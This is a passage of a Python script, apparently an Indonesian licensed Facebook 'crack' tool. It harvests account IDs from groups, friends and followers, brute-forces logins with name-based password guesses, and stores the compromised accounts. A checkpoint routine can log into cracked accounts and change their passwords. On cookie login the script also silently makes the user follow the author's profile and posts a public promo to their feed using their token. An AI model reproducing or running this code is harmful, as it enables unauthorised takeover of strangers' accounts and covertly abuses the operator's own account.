#!/usr/bin/python3
#-*-coding:utf-8-*-


# ------- Coded by Fahmidev ------- #
# ------- Jangan di recode ------- #
# ------- Note : Gw bukan rekod sc yayan, gw buat dari awal tapi menunya gw samain


# ------- INSTALL MODULE ------- #
import os
try:  import rich
except ImportError: os.system('pip install rich')
try:  import requests
except ImportError: os.system('pip install requests')
try:  import bs4
except ImportError: os.system('pip install bs4')
try:  import concurrent.futures
except ImportError: os.system('pip install futures')

# ------- MODULE ------- #
import sys, time, bs4, re, requests, json, random, subprocess
from bs4 import BeautifulSoup
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ------- MODULE RICH ------- #
from rich import print as prints
from rich.progress import track
from rich.progress import Progress
from rich.panel import Panel
from rich.tree import Tree
from rich.text import Text as Texts


# ------- WARNA ------- #
# ------- WARNA DEFAULT ------- #
Z = '\x1b[1;90m'
P = '\x1b[1;97m'
W = '\x1b[1;97m'
N = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
d = '\x1b[1;90m'
m = '\x1b[1;91m'
h = '\x1b[1;92m'
k = '\x1b[1;93m'
b = '\x1b[1;94m'
j = '\x1b[1;95m'
a = '\x1b[1;96m'
p = '\x1b[1;97m'

# ------- WARNA RICH BOLD ------- #
RPB = "[bold white]"
RGB = "[bold green]"
RBB = "[bold blue]"
RCB = "[bold cyan]"
RMB = "[bold red]"
RBLB = "[bold black]"
RYB = "[bold yellow]"
ROB = "[bold orange]"
RPKB = "[bold pink]"
RDPKB = "[bold deep_pink3]"

# ------- WARNA RICH BIASA ------- #
RP = "[white]"
RG = "[green]"
RB = "[blue]"
RC = "[cyan]"
RM = "[red]"
RBL = "[black]"
RY = "[yellow]"
RO = "[orange]"
RPK = "[pink]"
RDPK = "[deep_pink3]"

# ------- CLEAR ------- #
RCL = "[/]"


# ------- USER AGENT RANDOM ------- #
useragent1 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
useragent2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']


# ------- ARRAY ------- #
version = "5"
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
tampilapk = []
passwordtambahan = []
setpas = []
manualpas = []
setusragent = []
Methode = []
id = []
OK = []
CP = []
loop = 0
url_mb = "https://mbasic.facebook.com"


# ------- LISENSE WEB ------- #
token_app = "WyIxNTE1NzAzOSIsIklVU2RPRjZkQ2xRWUt1c2Y0NEhQU2tmS3BtNjY1RkZIY2FKWHZKcGoiXQ=="
id_app = "14376"


# ------- WAKTU ------- #
sekarang = datetime.now()
tahun = sekarang.year
bulan = sekarang.month
hari = sekarang.day


bulan_ttl = {
    '01': 'Januari',
    '02': 'Februari',
    '03': 'Maret',
    '04': 'April',
    '05': 'Mei',
    '06': 'Juni',
    '07': 'Juli',
    '08': 'Agustus',
    '09': 'September',
    '10': 'Oktober',
    '11': 'November',
    '12': 'Desember'
}


list_bulan = [
    'Januari',
    'Februari',
    'Maret',
    'April',
    'Mei',
    'Juni',
    'Juli',
    'Agustus',
    'September',
    'Oktober',
    'November',
    'Desember'
]


try:
    if bulan < 0 or bulan > 12:
        exit()
    else:
        bulan_sekarang = bulan - 1
        bulan = list_bulan[bulan_sekarang]
except ValueError:
    exit()
tanggal = '%s-%s-%s' % (hari, bulan, tahun)
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[bulan_sekarang]


# ------- LOGO ------- #
def logo():
    wrandom = random.choice(["[bold deep_pink3]", "[bold blue]", "[bold green]"])
    prints(Panel(f"""{wrandom} ▄▄▄▄· ▄▄▄  ▄• ▄▌▄▄▄▄▄▄▄▄ .    ·▄▄▄▄▄▄▄· 
 ▐█ ▀█▪▀▄ █·█▪██▌•██  ▀▄.▀·    ▐▄▄·▐█ ▀█▪  [bold white]Author: Fahmidev{wrandom}
 ▐█▀▀█▄▐▀▀▄ █▌▐█▌ ▐█.▪▐▀▀▪▄    ██▪ ▐█▀▀█▄  [bold white]Tools: Brute{wrandom}
 ██▄▪▐█▐█•█▌▐█▄█▌ ▐█▌·▐█▄▄▌    ██▌.██▄▪▐█  [bold white]Version: {version} {wrandom}
 ·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀     ▀▀▀ ·▀▀▀▀ """))


# ------- SETTINGS CRACK ID ------- #
def dmid():
    prints(Panel("""[bold white][[bold cyan]01[bold white]]. Crack id akun old
[bold white][[bold cyan]02[bold white]]. Crack akun id new
[bold white][[bold cyan]03[bold white]]. Crack akun id old + new""", title="[bold green]SETTINGS ID"))


# ------- SETTINGS APK ------- #
def setapk():
    prints(Panel(f"""[bold white]menampilkan aplikasi maka akun akan mudah terkena chekpoint
dikarenakan memakai module requests berlebihan. tidak di
sarankan untuk menampilkan aplikasi."""))


# ------- SETTINGS METHODE CRACK ------- #
def metode():
    prints(Panel(Texts(f"""[ pilih method login - silahkan coba satu² ]""", justify="center")))
    prints(Panel(f"""[bold white][[bold cyan]1[bold white]]. method B-API (fast) [bold red]OFF[bold white]
[bold white][[bold cyan]2[bold white]]. method free facebook (fast)
[bold white][[bold cyan]3[bold white]]. method mbasic (slow) [ [bold green]Disarankan [bold white]]
[bold white][[bold cyan]4[bold white]]. method mobile (super slow) [ [bold green]Disarankan [bold white]]""", title="[bold green]METHODE LOGIN"))


# ------- SETTINGS PASSWORD MANUAL ------- #
def setpasw():
    if "Fahmidev" in manualpas:
      prints(Panel(f"""[bold white][[bold cyan]1[bold white]]. nama1+123 nama1+12345 namalengkap
[bold white][[bold cyan]2[bold white]]. nama1+123 nama1+12345 namalengkap nama1+nama2
[bold white][[bold cyan]3[bold white]]. passwordmanual
[bold white][[bold cyan]4[bold white]]. nama1+123 nama1+12345 namalengkap passwordmanual""", title="[bold green]SETTINGS PASSWORD"))
    else:
      prints(Panel(f"""[bold white][[bold cyan]1[bold white]]. nama1+123 nama1+12345 namalengkap
[bold white][[bold cyan]2[bold white]]. nama1+123 nama1+12345 namalengkap nama1+nama2""", title="[bold green]SETTINGS PASSWORD"))


# ------- SETTINGS PASSWORD MANUAL JUGA ------- #
def setpaswm():
    prints(Panel("""anda bisa menambahkan sandi tambahan menggunakan koma (,) sebagai pemisah (contoh: sayang,bissmilah,katasandi). Jika tidak ingin menambahkan sandi bisa kalian skip/enter saja."""))


# ------- SETTINGS USERAGENT ------- #
def setugent():
    prints(Panel(f"""[bold white][[bold cyan]1[bold white]]. gunakan user agent random
[bold white][[bold cyan]2[bold white]]. gunakan user agent hp sendiri
[bold white][[bold cyan]3[bold white]]. gunakan user agent bawaan script""", title="[bold green]SETTINGS USERAGENT"))


# ------- INFO CRACK ------- #,
def info():
    prints(Panel(f"""[bold white][[bold cyan]+[bold white]] hasil OK disimpan ke -> OK/{tanggal}.txt
[bold white][[bold cyan]+[bold white]] hasil CP disimpan ke -> CP/{tanggal}.txt
\n[bold white][[bold red]×[bold white]] hidupkan mode pesawat 2 detik jika tidak ada hasil"""))


# ------- TOTAL CRACK OK, CP ------- #
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print("\n", end="\r")
        prints(Panel(f"""[bold white][[bold cyan]#[bold white]] crack selesai...\n
[bold white][[bold cyan]+[bold white]] [bold green]total OK : {str(len(ok))}
[bold white][[bold cyan]+[bold white]] [bold yellow]total CP : {str(len(cp))}"""))
        cek_cp = input(f"  {P}[{O}?{P}] munculkan opsi checkpoint detedtor [Y/t]: ")
        if cek_cp =="":
            prints(Panel("[bold white][[bold red]![bold white]] jangan kosong"));time.sleep(3);hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            prints(Panel("[bold white][[bold yellow]![bold white]] hidupkan mode pesawat 3 detik terlebih dahulu."));time.sleep(2)
            ww=input(f"  {P}[{O}?{P}] ubah password ketika tap yes [Y/t]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                prints(Panel("[bold white][[bold cyan]•{P}] contoh password : [bold green]Fahmidev"))
                pwBar=input(f"  {P}[{H}+{P}] masukan password baru : ")
                if len(pwBar) <= 5:
                    prints(Panel('[bold white][[bold red]![bold white]] kata sandi minimal 6 karakter'))
                else:
                    pwBaru.append(pwBar)
            print()
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split('|')
                jalan(f' {P}[{M}>{P}] mencoba login ke akun : {K}{kontol.replace(" [×] ", "")}{P}')
                try:
                    log_hasil(titid[0].replace(" [×] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                print("")
            print("")
            prints(Panel(Texts('[ Proses Pengecekan Selesai ]', justify="center")))
            input('  %s[ %sKELUAR%s ] '%(P,O,P));exit()
        elif cek_cp in["T","t"]:
            prints(Panel("[bold cyan]*[bold white] Selamat tinggal:)"));exit()
        else:
            prints(Panel("[bold white][[bold red]![bold white]] Y/t goblok"));time.sleep(2);hasil(ok,cp)
    else:
        print()
        prints(Panel('[bold white][[bold yellow]![bold white]] opshh kamu tidak mendapatkan hasil :('));exit()


# ------- USERNAME CONVERT TO ID ------- #
def __convert__(user):
    return {"value": user}
    try:
        session = requests.Session()
        url_lookup = "https://lookup-id.com/"
        if user == "me":
            return {"value":user}
        else:
            payload = {"fburl": "https://free.facebook.com/{}".format(user), "check": "Lookup"}
            if "facebook" in user:
                payload = {"fburl": user, "check": "Lookup"}
            mmk = session.post(url_lookup, data=payload).content
            xxx = BeautifulSoup(mmk, "html.parser")
            idt = xxx.find("span", id="code")
            asw = idt.text
            return {"value":asw}
    except:
        menu()


# ------- BOT FOLLOW COOKIES ------- #
def botfollow(coki):
    session = requests.Session()
    r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100075921995470",cookies={"cookie":coki}).text,"html.parser")
    get = r.find("a",string="Ikuti").get("href")
    session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text


# ------- CONVERT COOKIES LIST TO STRINGS ------- #
def convert_cookie(cok):
    x = ";".join([str(i[0])+'='+str(i[1]) for i in cok.items()])
    src = re.search("datr..*", str(x)).group(0)
    srcc = re.search("c_user.\w+", str(x)).group(0)
    coki = src + ";" + srcc
    return coki


# ------- KONEKSI ERROR ------- #
def connect_error():
    prints(Panel('[bold white][[bold red]![bold white]] Koneksi error'))
    exit()


# ------- NEED COOKIES ------- #
def needcookies():
    prints(Panel("""[bold white]fitur ini membutuhkan cookies. login menggunakan cookies untuk membuka fitur ini."""))
    time.sleep(3)
    menu()


# ------- COOKIES INVALID ------- #
def cokieinvalid():
    prints(Panel("""[bold white][[bold yellow]![bold white]] cookies invalid, login ulang ..."""))
    time.sleep(3)
    menu()


# ------- ANIMASI TEKS ------- #
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


# ------- HAPUS TOKEN & COOKIES ------- #
def hapus():
    os.system('rm -rf .token.txt .cokie.txt')


# ------- CLEAR TERMINAL ------- #
def clear():
    os.system('clear')


# ------- CEK COOKIES ------- #
def check_kokis(kue):
    cookied = {'cookie': kue}
    fb = 'https://m.facebook.com'
    with requests.Session() as (ses_dev):
        try:
            login = ses_dev.get(fb, cookies=cookied).content
        except requests.exceptions.ConnectionError:
            clear()
            exit('%s[%s!%s] %sPeriksa Jaringan Anda'%(O,M,O,M))
        if "mbasic_logout_button" in str(login):
            return {"Login": "Succes"}
        elif "checkpoint" in str(login):
            exit()
        else:
            exit()


# ------- FILE LISENSEE ------- #
def urlkey():
    key = '.lisense.txt'
    return key


# ------- LOGIN LISENSE ------- #
def loglisensi():
    ses = requests.Session()
    no_wa = "6285703065267"
    url_wa = ("https://api.whatsapp.com/send?phone="+no_wa+"&text=")
    try:
        key = open('.lisense.txt', 'r').read()
    except:
        prints(Panel("""[bold white][[bold red]![bold white]] kamu belum punya lisensi. Jika sudah punya ketik 'key'"""))
        lk = input(f'  {P}[{O}?{P}] ingin membeli lisensi? [Y/t] : ').lower()
        while lk == '':
            lk = input(f'  {P}[{O}?{P}] ingin membeli lisensi? [Y/t] : ').lower()
        if lk == 'y':
            prints(Panel("""[bold white][[bold cyan]*[bold white]] masukan nama anda"""))
            nama = input(f'  {P}[{O}*{P}] Nama : ')
            prints(Panel(f"""[bold white][[bold cyan]![bold white]] masukan email {H}aktif {P}anda"""))
            email = input(f'  {P}[{O}*{P}] Email : ')
            tks = (f"Assalamualaikum kak, saya mau beli key/lisensi script MBF\nNama  : {nama}\nEmail : {email}")
            prints(Panel("""[bold white][[bold cyan]*[bold white]] Menuju ke Whatsapp ..."""))
            subprocess.check_output(["am", "start", url_wa+tks])
            lisense()
        elif lk == 't':
            exit()
        elif lk == 'key':
            lisense()
        else:
            exit()
    my_key = key
    link=ses.get(f'https://app.cryptolens.io/api/key/Activate?token={token_app}&ProductId={id_app}&Key={my_key}&Metadata=true')
    l=json.loads(link.text)
    try:
        col = l['licenseKey']
        ## ------- GET EXPIRED
        join_key = col['created'][:10]
        tahun,bulan,hari = join_key.split("-")
        bulan = bulan_ttl[bulan]
        exit_key = col['expires'][:10]
        tahun2,bulan2,hari2 = exit_key.split("-")
        bulan2 = bulan_ttl[bulan2]
        ## ------- GET DATA
        tod = col['customer']
        nama_key = tod['name']
        email = tod['email']
        metadata = l['metadata']
        status = metadata['licenseStatus']
        waktu = status['timeLeft']
        if int(waktu) == 0:
            prints(Panel("""[bold white][[bold red]×[bold white]] Lisensi anda telah expired. Silahkan beli lisensi lagi"""))
            os.remove(urlkey())
            time.sleep(1)
            exit()
        else:
            menu()
    except (KeyError, IOError):
        prints(Panel("""[bold white][[bold red]×[bold white]] Lisensi anda telah expired. Silahkan beli lisensi lagi"""))
        os.remove(urlkey())
        time.sleep(1)
        exit()


# ------- INFO AKUN V1 ------- #
def infoakun1(user, coki, h_ok):
    try:
        session = requests.Session()
        session.get("https://mbasic.facebook.com/home.php", cookies={"cookie":coki})
        get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
        nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
        response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
        response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
        response3 = session.get(f"https://mbasic.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
        response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
        try:  nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
        except: nomer = "-"
        try:  email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
        except: email="-"
        try:  teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
        except: teman = "0"
        try:  pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
        except: pengikut = "0"
        apk = []
        r = requests.Session()
        r.get('https://mbasic.facebook.com/home.php', cookies={"cookie": coki})
        w=r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki})
        sop = BeautifulSoup(w.content,"html.parser")
        x = sop.find("form",method="post")
        game = [i.text for i in x.find_all("h3")]
        for i in range(len(game)):
            apk.append("\r             %s%s. %s%s\n"%(RGB,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),RPB))
        w=r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki})
        sop = BeautifulSoup(w.content,"html.parser")
        x = sop.find("form",method="post")
        game = [i.text for i in x.find_all("h3")]
        for i in range(len(game)):
            apk.append("\r             %s%s. %s%s\n"%(RYB,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),RPB))
        print(end="\r")
        prints(Panel(f"""{h_ok}
  {RPB}│
  {RPB}├──────[{RCB}•{RPB}] Nama     : {nama}
  {RPB}├──────[{RCB}•{RPB}] Nomer hp : {nomer}
  {RPB}├──────[{RCB}•{RPB}] Email    : {email}
  {RPB}├──────[{RCB}•{RPB}] Teman    : {teman}
  {RPB}╰────┬─[{RCB}•{RPB}] Pengikut : {pengikut}
       {RPB}│
       {RPB}╰─[{RGB}*{RPB}] Aplikasi yang terkait :
{''.join(apk)}""", title="[bold green]OK"))

    except Exception as e:
        print(e)


# ------- INFO AKUM V2 ------- #
def infoakun2(user, coki, h_ok):
    try:
        session = requests.Session()
        session.get("https://mbasic.facebook.com/home.php", cookies={"cookie":coki})
        get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
        nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
        response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
        response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
        try:  teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
        except: teman = "0"
        try:  pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
        except: pengikut = "0"
        apk = []
        r = requests.Session()
        r.get('https://mbasic.facebook.com/home.php', cookies={"cookie": coki})
        w=r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki})
        sop = BeautifulSoup(w.content,"html.parser")
        x = sop.find("form",method="post")
        game = [i.text for i in x.find_all("h3")]
        for i in range(len(game)):
            apk.append("\r             %s%s. %s%s\n"%(RGB,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),RPB))
        w=r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki})
        sop = BeautifulSoup(w.content,"html.parser")
        x = sop.find("form",method="post")
        game = [i.text for i in x.find_all("h3")]
        for i in range(len(game)):
            apk.append("\r             %s%s. %s%s\n"%(RYB,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),RPB))
        print(end="\r")
        prints(Panel(f"""{h_ok}
  {RPB}│
  {RPB}├──────[{RCB}•{RPB}] Nama     : {nama}
  {RPB}├──────[{RCB}•{RPB}] Teman    : {teman}
  {RPB}╰────┬─[{RCB}•{RPB}] Pengikut : {pengikut}
       {RPB}│
       {RPB}╰─[{RGB}*{RPB}] Aplikasi yang terkait :
{''.join(apk)}""", title="[bold green]OK"))

    except Exception as e:
        print(e)


# ------- INFO AKUN V3 ------- #
def infoakun3(user, coki, h_ok):
    try:
        apk = []
        r = requests.Session()
        r.get('https://mbasic.facebook.com/home.php', cookies={"cookie": coki})
        w=r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki})
        sop = BeautifulSoup(w.content,"html.parser")
        x = sop.find("form",method="post")
        game = [i.text for i in x.find_all("h3")]
        for i in range(len(game)):
            apk.append("\r        %s%s. %s%s\n"%(RGB,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),RPB))
        w=r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki})
        sop = BeautifulSoup(w.content,"html.parser")
        x = sop.find("form",method="post")
        game = [i.text for i in x.find_all("h3")]
        for i in range(len(game)):
            apk.append("\r        %s%s. %s%s\n"%(RYB,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),RPB))
        print(end="\r")
        prints(Panel(f"""{h_ok}
  {RPB}│
  {RPB}╰─[{RGB}*{RPB}] Aplikasi yang terkait :
{''.join(apk)}""", title="[bold green]OK"))

    except Exception as e:
        print(e)


# ------- LOGIN TOKEN & COOKIES ------- #
def login():
    clear()
    logo()
    prints(Panel(f"""[bold white][[bold cyan]01[bold white]]. Login menggunakan token
[bold white][[bold cyan]02[bold white]]. Login menggunakan cookies
[bold white][[bold cyan]03[bold white]]. Checkpoin detektor""", title="[bold red]•[bold yellow]•[bold cyan]• [bold green]menu pilihan [bold cyan]•[bold yellow]•[bold red]•"))
    pilih = input('  %s%s[%s*%s] %slogin : %s'%(P,P,O,P,P,P))
    if pilih == '':
      login()
    elif pilih in ['1', '01']:
        prints(Panel("        [bold white][[bold green]•[bold white]] Masukan token facebook anda [bold white][[bold green]•[bold white]]"))
        token = input('  %s[%s*%s] %stoken : %s'%(P,O,P,P,P))
        if token == '':
            login()
        else:
            try:
                otw = requests.get('https://graph.facebook.com/me?access_token='+token)
                a = json.loads(otw.text)
                print(a)
                zedd = open('.token.txt', 'w')
                zedd.write(token)
                zedd.close()
                ## requests.post(f"https://graph.facebook.com/100075921995470?fields=subscribers&access_token={token}")
                ## requests.get('https://graph.facebook.com/v2.0/me/feed?method=post&privacy={"value":"EVERYONE"}&message=Ikuti fb temen saya bang&link=https://mbasic.facebook.com/101872325686834&access_token='+str(token))
                prints(Panel(f'[bold white][[bold cyan]*[bold white]] Selamat datang {a["name"]}'))
                input(f"  {P}[{O}*{P}] Enter")
                menu()

            except Exception as e:
                print(e)
                exit()
                prints(Panel('[bold white][[bold red]![bold white]] Token invalid'))
                time.sleep(2)
                login()

            except requests.exceptions.ConnectionError:
                connect_error()
    elif pilih in ['2', '02']:
        prints(Panel("        [bold white][[bold green]•[bold white]] Masukan cookies facebook anda [bold white][[bold green]•[bold white]]"))
        cookie = input('  %s[%s*%s] %scookies : ' % (P, O, P, P))
        cokex = cookie
        user = cokex.split("c_user=")[1]
        try:  user = user.split(";")[0]
        except: user = ""
        kukis_sus = cokex
        kukis_sus = kukis_sus.replace("noscript=1", "")
        kukis_impos = ""
        kukis_sus = kukis_sus.replace("c_user="+user+";", "")
        kukis_sus = kukis_sus.replace(";c_user="+user+";", "")
        kukis_sus = kukis_sus.replace(";c_user="+user, "")
        kukis_sus = kukis_sus.replace("c_user="+user, "")
        kukis_impos += kukis_sus
        kukis_impos += ";"
        kukis_impos += "c_user="
        kukis_impos += user
        coki = cookie
        try:
            ses = requests.Session()
            data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":coki})
            find_token = re.search("(EAAG\w+)", data.text)
            # namal = ses.get("https://graph.facebook.com/me?access_token="+find_token.group(1)).json()["name"]
            open(".token.txt", "w").write(find_token.group(1))
            open(".cokie.txt", "w").write(coki)
            botfollow(coki)
            otw = requests.get('https://graph.facebook.com/me?access_token='+find_token.group(1))
            a = json.loads(otw.text)
            prints(Panel(f'[bold white][[bold cyan]*[bold white]] Selamat datang {a["name"]}'))
            prints(Panel("[bold white][[bold cyan]*[bold white]] Jalankan script nya lagi ( python run.py )"))
            requests.get('https://graph.facebook.com/v2.0/me/feed?method=post&privacy={"value":"EVERYONE"}&message=Ikuti fb temen saya bang&link=https://mbasic.facebook.com/101872325686834&access_token='+str(find_token.group(1)))
            exit()
        except Exception as e:
            print(e)
        except requests.exceptions.ConnectionError:
            time.sleep(1)
            exit()
        except (KeyError, IOError, AttributeError):
            time.sleep(1)
            exit()
    elif pilih in ['3', '03']:
        cekFiles()


# ------- MENU ------- #
def menu():
    clear()
    logo()
    key = open('.lisense.txt', 'r').read()
    my_key = key
    link=requests.get(f'https://app.cryptolens.io/api/key/Activate?token={token_app}&ProductId={id_app}&Key={my_key}&Metadata=true')
    l=json.loads(link.text)
    col = l['licenseKey']
    ## ------- GET EXPIRED ------- #
    join_key = col['created'][:10]
    tahun,bulan,hari = join_key.split("-")
    bulan = bulan_ttl[bulan]
    exit_key = col['expires'][:10]
    tahun2,bulan2,hari2 = exit_key.split("-")
    bulan2 = bulan_ttl[bulan2]
    ## ------- GET DATA ------- #
    tod = col['customer']
    nama_key = tod['name']
    email = tod['email']
    _status_ = col['notes']
    metadata = l['metadata']
    status = metadata['licenseStatus']
    waktu = status['timeLeft']
    my_lisen = (my_key.split('-')[0] + "-XXXXX-" + my_key.split('-')[2] + "-XXXXX")
    if _status_ == "Trial": stt = '[bold red]Tidak'
    else: stt = '[bold green]Ya'
    try:  token = open('.token.txt', 'r').read()
    except: hapus();login()
    try:  otw = requests.get('https://graph.facebook.com/me?access_token=' + token);a = json.loads(otw.text);nama = a['name'];idme = a['id']
    except (KeyError, IOError): hapus();login()
    except requests.exceptions.ConnectionError: connect_error()
    try:  ip = requests.get('http://ip-api.com/json').json()['query']
    except KeyError:  ip = ' '
    prints(Panel(f"""[bold white][[bold cyan]•[bold white]] Nama       : {nama_key}
[bold white][[bold cyan]•[bold white]] Bergabung    : {hari} {bulan} {tahun}
[bold white][[bold cyan]•[bold white]] Email        : {email}
[bold white][[bold cyan]•[bold white]] Premium      : {stt}
[bold white][[bold cyan]•[bold white]] Kedaluarsa   : {hari2} {bulan2} {tahun2}
[bold white][[bold cyan]•[bold white]] Status aktif : {waktu} Hari lagi
[bold white][[bold cyan]•[bold white]] Lisensi      : {my_lisen}""", title="[bold green]info lisensi"))
    prints(Panel(f"""      [bold white][[bold cyan]+[bold white]] [bold white]Selamat datang {nama} [bold white][[bold cyan]+[bold white]]""", title=f"[bold yellow]•[bold cyan] {idme} [bold yellow]•[bold white]"))
    prints(Panel(f"""[bold white][[bold cyan]01[bold white]]. Crack dari anggota grup     [bold white][[bold cyan]06[bold white]]. Crack dari komentar
[bold white][[bold cyan]02[bold white]]. Crack dari teman publik     [bold white][[bold cyan]07[bold white]]. Check hasil crack
[bold white][[bold cyan]03[bold white]]. Crack dari total followers  [bold white][[bold cyan]08[bold white]]. Hapus lisensi
[bold white][[bold cyan]04[bold white]]. Crack dari like postingan   [bold white][[bold cyan]09[bold white]]. Checkpoint detektor
[bold white][[bold cyan]05[bold white]]. Crack dari random id massal [bold white][[bold cyan]00[bold white]]. Keluar (logout)""", title="[bold red]•[bold yellow]•[bold cyan]• [bold green]menu pilihan [bold cyan]•[bold yellow]•[bold red]•"))
    pilih = input('  %s[%s*%s] %smenu : %s'%(P,O,P,P,P))
    if pilih == '':
        menu()
    elif pilih in ['1', '01']:
        if "Trial" in _status_:
            prints(Panel("""[bold white][[bold red]×[bold white]] anda adalah user trial cuma bisa menggunakan menu nomor [bold cyan]02[bold white]. upgrade ke premium untuk menikmati semua fitur..."""))
            time.sleep(3)
            menu()
        else:
            prints(Panel("[bold white][[bold cyan]*[bold white]] masukan id grup yang ingin anda crack"))
            kontol = input(f"  {P}[{O}?{P}] id grup : ")
            if kontol in[""," "]:
                prints(Panel('[bold white][[bold red]![bold white]] jangan kosong kentod!'));time.sleep(2);menu()
            else:
                try:
                    try:
                        kukis = open('.cokie.txt', 'r').read()
                    except (KeyError, IOError):
                        needcookies()
                    ajg=requests.get(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}", cookies={"cookie": kukis}).text
                    if "Halaman Tidak Ditemukan" in ajg:
                        prints(Panel(f"[bold white][[bold red]![bold white]] group dengan id {kontol} tidak ditemukan"));time.sleep(2);menu()
                    elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
                        prints(Panel("[bold white][[bold yellow]![bold white]] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun"));time.sleep(2);menu()
                    elif "Konten Tidak Ditemukan" in ajg:
